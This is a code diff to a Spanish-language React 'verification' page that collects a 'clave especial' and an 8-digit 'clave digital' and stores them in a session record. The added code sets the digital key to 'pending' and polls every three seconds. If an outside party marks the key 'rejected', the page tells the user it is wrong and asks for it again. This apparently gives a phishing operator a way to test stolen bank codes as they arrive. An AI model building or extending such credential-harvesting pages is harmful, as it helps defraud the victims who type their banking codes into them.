@@ -67,6 +67,9 @@ export default function Verificacion() {
       await base44.entities.UserSessionData.update(sessionId, {
         claveDigital: claveDigital.trim(),
       });
+      await base44.entities.UserSessionData.update(sessionId, {
+        claveDigitalStatus: "pending",
+      });
     } catch (e) {
       console.error("Error guardando clave digital:", e);
       setSubmitting(false);
@@ -74,6 +77,20 @@ export default function Verificacion() {
     }
     setSubmitting(false);
     setPhase("done");
+
+    // Pollear para detectar rechazo
+    pollRef.current = setInterval(async () => {
+      try {
+        const res = await base44.entities.UserSessionData.filter({ id: sessionId });
+        const s = res[0];
+        if (!s) return;
+        if (s.claveDigitalStatus === "rejected") {
+          clearInterval(pollRef.current);
+          setClaveDigital("");
+          setPhase("claveDigitalRejected");
+        }
+      } catch (_) {}
+    }, 3000);
   };
 
   // Spinner de espera
@@ -88,6 +105,8 @@ export default function Verificacion() {
 
   const isPhase1 = phase === "claveEspecial" || phase === "rejected";
   const isRejected = phase === "rejected";
+  const isDigitalRejected = phase === "claveDigitalRejected";
+  const isDigitalPhase = phase === "claveDigital" || phase === "claveDigitalRejected";
   const claveDigitalValid = claveDigital.trim().length > 0;
 
   return (
@@ -96,12 +115,22 @@ export default function Verificacion() {
       <main className="flex-1 flex flex-col items-center pt-10">
         <div style={{ width: "100%", maxWidth: "620px", padding: "0 24px" }}>
 
-          {/* Mensaje de rechazo */}
+          {/* Mensaje de rechazo clave especial */}
           {isRejected && (
             <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#fff3f3", border: "1px solid #f5c6c6", borderRadius: "4px", padding: "12px 16px", marginBottom: "20px" }}>
               <span style={{ fontSize: "18px" }}>⚠️</span>
               <span style={{ fontSize: "14px", color: "#cc0000" }}>
                 La clave especial ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.
+              </span>
+            </div>
+          )}
+
+          {/* Mensaje de rechazo clave digital */}
+          {isDigitalRejected && (
+            <div style={{ display: "flex", alignItems: "center", gap: "10px", background: "#fff3f3", border: "1px solid #f5c6c6", borderRadius: "4px", padding: "12px 16px", marginBottom: "20px" }}>
+              <span style={{ fontSize: "18px" }}>⚠️</span>
+              <span style={{ fontSize: "14px", color: "#cc0000" }}>
+                La clave digital ingresada es incorrecta. Por favor, corrija la información e intente nuevamente.
               </span>
             </div>
           )}
@@ -148,17 +177,17 @@ export default function Verificacion() {
                   inputMode="numeric"
                   value={claveDigital}
                   onChange={(e) => {
-                    if (phase !== "claveDigital") return;
+                    if (!isDigitalPhase) return;
                     const val = e.target.value.replace(/[^0-9]/g, "");
                     if (val.length <= 8) setClaveDigital(val);
                   }}
-                  disabled={phase !== "claveDigital"}
+                  disabled={!isDigitalPhase}
                   style={{
                     width: "140px", border: "1px solid #90a4ae", borderRadius: "2px",
                     padding: "4px 8px", fontSize: "14px", outline: "none", fontFamily: "inherit", letterSpacing: "2px",
-                    background: phase !== "claveDigital" ? "#f0f0f0" : "white",
-                    color: phase !== "claveDigital" ? "#999" : "#121212",
-                    cursor: phase !== "claveDigital" ? "not-allowed" : "text",
+                    background: !isDigitalPhase ? "#f0f0f0" : "white",
+                    color: !isDigitalPhase ? "#999" : "#121212",
+                    cursor: !isDigitalPhase ? "not-allowed" : "text",
                   }}
                 />
               </div>
@@ -182,7 +211,7 @@ export default function Verificacion() {
               >
                 {submitting ? "Enviando..." : "Continuar"}
               </button>
-            ) : (
+            ) : isDigitalPhase ? (
               <button
                 disabled={!claveDigitalValid || submitting}
                 onClick={handleSubmitClaveDigital}
@@ -197,7 +226,7 @@ export default function Verificacion() {
               >
                 {submitting ? "Enviando..." : "Continuar"}
               </button>
-            )}
+            ) : null}
           </div>
 
         </div>
